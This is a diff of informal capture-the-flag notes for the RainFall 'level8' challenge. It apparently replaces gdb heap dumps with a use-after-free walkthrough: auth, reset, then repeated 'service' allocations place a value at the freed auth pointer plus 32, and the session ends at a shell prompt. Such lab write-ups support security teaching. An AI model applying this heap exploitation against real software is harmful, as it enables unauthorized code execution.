@@ -1,52 +1,41 @@
-we can exploit once again heap
+We can exploit heap, use-after-free
 
+Let's auth as an user
 
-gdb ./level8
+auth user
+0x804a008, (nil)
 
-auth admin
+Then we call reset
+reset
+0x804a008, (nil)
 
-(gdb)info proc mappings
+We can see that our address still exist because it was not set as 0, if we call
+service it will have the same addresse as auth
 
-(gdb) x/20wx 0x804a000
-0x804a000:	0x00000000	0x00000011	0x696d6461	0x00000a6e
-0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
-0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
+service AAA
+0x804a008, 0x804a008
 
-
-we can see that our mallocated zone contain our strings
-
-
-lets see what happens with reset -> 
-
-
-we do a macro for this before
-
-command
-echo ---heap----------------
-x/20wx 0x804a000
-echo ---------------------
-continue
-end
-
-put a breakpoint on printf
-
-then call reset
-Breakpoint 1, 0x08048591 in main ()
-0x804a000:	0x00000000	0x00000011	0x00000000	0x00000a6e
-0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
-0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
-
-
-mallocated auth is now 0
+Now to pass login, we need to add an value at 0x804a008 + 32, service do this
 
 auth login
-service AAA
-service BBB
+reset
+service A 0x804a008 => 0 - 16
+service B           => 16 - 32
+service C           => 32 - 48
 
-we can see that it overwrite where auth
-gg
-the malloc(4) is sizeup for alignmenent to 8 but it should be 36 so we can overwrite easy
+0x804a008 + 32 should now be equal to something..
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth login
+0x804a008, (nil)
+reset
+0x804a008, (nil)
+service A
+0x804a008, 0x804a008
+service B
+0x804a008, 0x804a018
+service C
+0x804a008, 0x804a028
+login
+$
